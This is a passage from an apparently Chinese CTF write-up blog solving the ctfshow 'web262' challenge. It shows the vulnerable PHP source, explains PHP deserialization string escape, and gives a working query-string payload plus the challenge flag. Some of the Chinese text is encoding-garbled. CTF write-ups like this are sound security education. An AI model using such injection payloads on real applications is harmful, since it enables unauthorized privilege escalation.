</code></pre><h2 id="web262"><a class="anchor" href="#web262">#</a> web262</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-12-03 02:37:19</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-12-03 16:05:38</pre></td></tr><tr><td data-num="9"></td><td><pre># @message.php</pre></td></tr><tr><td data-num="10"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>*/</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>æˆ‘ä»¬éœ€è¦å°†token=adminï¼Œs:5:"token";s:5:"admin"</pre></td></tr><tr><td data-num="4"></td><td><pre>ç›®å‰åªæœ‰fromã€msgã€toæ˜¯å¯æ§çš„</pre></td></tr><tr><td data-num="5"></td><td><pre>å‡å¦‚æˆ‘ä»¬å‘toå±æ€§ä¼ é€’t=3";s:5:"token";s:5:"admin";&#125;æˆ‘ä»¬å°±å¯ä»¥å°†å­—ç¬¦ä¸²è¿›è¡Œé—­åˆå°±èƒ½æ§åˆ¶tokençš„å€¼ï¼Œç„¶åå‘ç°toçš„é•¿åº¦å˜æˆäº†27</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>$umsg = str_replace('fuck', 'loveU', serialize($msg));</pre></td></tr><tr><td data-num="8"></td><td><pre>åˆ©ç”¨æ›¿æ¢å‡½æ•°fuckæ›¿æ¢æˆloveUè¿™æ ·å°±ä¼šå¢åŠ ä¸€ä¸ªå­—ç¬¦ä¸²</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$to</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æœ€ç»ˆæ„é€ payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>f<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>m<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>t<span class="token operator">=</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="token string double-quoted-string">";s:5:"</span>token<span class="token string double-quoted-string">";s:5:"</span>admin"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d87728c3-9d2a-469c-829a-690743aae333&#125;
</code></pre><h1 id="java"><a class="anchor" href="#java">#</a> java</h1><h2 id="web279"><a class="anchor" href="#web279">#</a> web279</h2><div class="tags"><a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">æ›´æ–°äº</span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-12-02 23:25:04" itemprop="dateModified" datetime="2024-12-02T23:25:04+08:00">2024-12-02</time> </span><span id="ctfshow-web/" class="item leancloud_visitors" data-flag-title="ctfshow-web" title="é˜…è¯»æ¬¡æ•°"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">é˜…è¯»æ¬¡æ•°</span> <span class="leancloud-visitors-count"></span> <span class="text">æ¬¡</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="K1nako å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="K1nako æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>K1nako <i class="ic i-at"><em>@</em></i>Kirakira!</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="http://k1nakoo.github.io/ctfshow-web/" title="ctfshow-web">http://k1nakoo.github.io/ctfshow-web/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;k1nako-images.netlify.app&#x2F;images&#x2F;105565364_p0_master1200.jpg" title="æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i></span><h3>æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢</h3></a></div><div class="item right"><a href="/misc%E7%BB%BC%E5%90%88/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;k1nako-images.netlify.app&#x2F;images&#x2F;wallhaven-zm892v.png" title="miscç»¼åˆ"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i></span><h3>miscç»¼åˆ</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">ä¿¡æ¯æœé›†</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-number">1.1.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">1.2.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-number">1.3.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">1.4.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web5"><span class="toc-number">1.5.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web6"><span class="toc-number">1.6.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">1.7.</span> <span class="toc-text">web7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-number">1.8.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web9"><span class="toc-number">1.9.</span> <span class="toc-text">web9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web10"><span class="toc-number">1.10.</span> <span class="toc-text">web10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web11"><span class="toc-number">1.11.</span> <span class="toc-text">web11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web12"><span class="toc-number">1.12.</span> <span class="toc-text">web12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web13"><span class="toc-number">1.13.</span> <span class="toc-text">web13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web14"><span class="toc-number">1.14.</span> <span class="toc-text">web14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15"><span class="toc-number">1.15.</span> <span class="toc-text">web15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web16"><span class="toc-number">1.16.</span> <span class="toc-text">web16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web17"><span class="toc-number">1.17.</span> <span class="toc-text">web17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web18"><span class="toc-number">1.18.</span> <span class="toc-text">web18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web19"><span class="toc-number">1.19.</span> <span class="toc-text">web19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web20"><span class="toc-number">1.20.</span> <span class="toc-text">web20</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">çˆ†ç ´</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web21"><span class="toc-number">2.1.</span> <span class="toc-text">web21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web22"><span class="toc-number">2.2.</span> <span class="toc-text">web22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web23"><span class="toc-number">2.3.</span> <span class="toc-text">web23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web24"><span class="toc-number">2.4.</span> <span class="toc-text">web24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web25"><span class="toc-number">2.5.</span> <span class="toc-text">web25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web26"><span class="toc-number">2.6.</span> <span class="toc-text">web26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web27"><span class="toc-number">2.7.</span> <span class="toc-text">web27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web28"><span class="toc-number">2.8.</span> <span class="toc-text">web28</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡Œ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">3.1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">3.2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">3.3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">3.4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">3.5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">3.6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">3.7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">3.8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">3.9.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">3.10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">3.11.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">3.12.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">3.13.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">3.14.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">3.15.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">3.16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">3.17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">3.18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47"><span class="toc-number">3.19.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48"><span class="toc-number">3.20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49"><span class="toc-number">3.21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50"><span class="toc-number">3.22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51"><span class="toc-number">3.23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">3.24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">3.25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">3.26.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">3.27.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">3.28.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">3.29.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58"><span class="toc-number">3.30.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web59"><span class="toc-number">3.31.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web60"><span class="toc-number">3.32.</span> <span class="toc-text">web60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web61"><span class="toc-number">3.33.</span> <span class="toc-text">web61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web62"><span class="toc-number">3.34.</span> <span class="toc-text">web62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web63"><span class="toc-number">3.35.</span> <span class="toc-text">web63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web64"><span class="toc-number">3.36.</span> <span class="toc-text">web64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web65"><span class="toc-number">3.37.</span> <span class="toc-text">web65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web66"><span class="toc-number">3.38.</span> <span class="toc-text">web66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web67"><span class="toc-number">3.39.</span> <span class="toc-text">web67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web68"><span class="toc-number">3.40.</span> <span class="toc-text">web68</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web69"><span class="toc-number">3.41.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web70"><span class="toc-number">3.42.</span> <span class="toc-text">web70</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71"><span class="toc-number">3.43.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">3.44.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web73"><span class="toc-number">3.45.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web74"><span class="toc-number">3.46.</span> <span class="toc-text">web74</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.</span> <span class="toc-text">æ–‡ä»¶åŒ…å«</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">4.1.</span> <span class="toc-text">web78</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79"><span class="toc-number">4.2.</span> <span class="toc-text">web79</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80"><span class="toc-number">4.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81"><span class="toc-number">4.4.</span> <span class="toc-text">web81</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82"><span class="toc-number">4.5.</span> <span class="toc-text">web82</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87"><span class="toc-number">4.6.</span> <span class="toc-text">web87</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88"><span class="toc-number">4.7.</span> <span class="toc-text">web88</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web116"><span class="toc-number">4.8.</span> <span class="toc-text">web116</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%89%B9%E6%80%A7"><span class="toc-number">5.</span> <span class="toc-text">php ç‰¹æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web89"><span class="toc-number">5.1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web90"><span class="toc-number">5.2.</span> <span class="toc-text">web90</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web91"><span class="toc-number">5.3.</span> <span class="toc-text">web91</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web92"><span class="toc-number">5.4.</span> <span class="toc-text">web92</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web93"><span class="toc-number">5.5.</span> <span class="toc-text">web93</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web94"><span class="toc-number">5.6.</span> <span class="toc-text">web94</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web95"><span 